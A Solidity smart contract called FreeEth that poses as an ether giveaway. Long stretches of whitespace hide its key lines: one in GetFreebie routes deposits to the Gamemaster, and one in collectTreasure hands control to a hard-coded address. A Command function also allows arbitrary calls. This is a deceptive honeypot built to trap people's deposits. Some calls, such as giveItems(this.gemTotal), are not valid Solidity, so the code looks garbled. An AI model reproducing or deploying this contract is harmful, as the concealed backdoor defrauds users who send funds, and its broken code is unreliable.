pragma solidity ^0.4.19;

contract FreeEth
{
    address public Gamemaster = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Gamemaster.giveItems(this.gemTotal);
            msg.sender.giveItems(this.gemTotal);
        }
    }

    function collectTreasure()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Gamemaster=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == Gamemaster);
        Gamemaster.giveItems(this.gemTotal);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Gamemaster);
        adr.call.value(msg.value)(data);
    }
}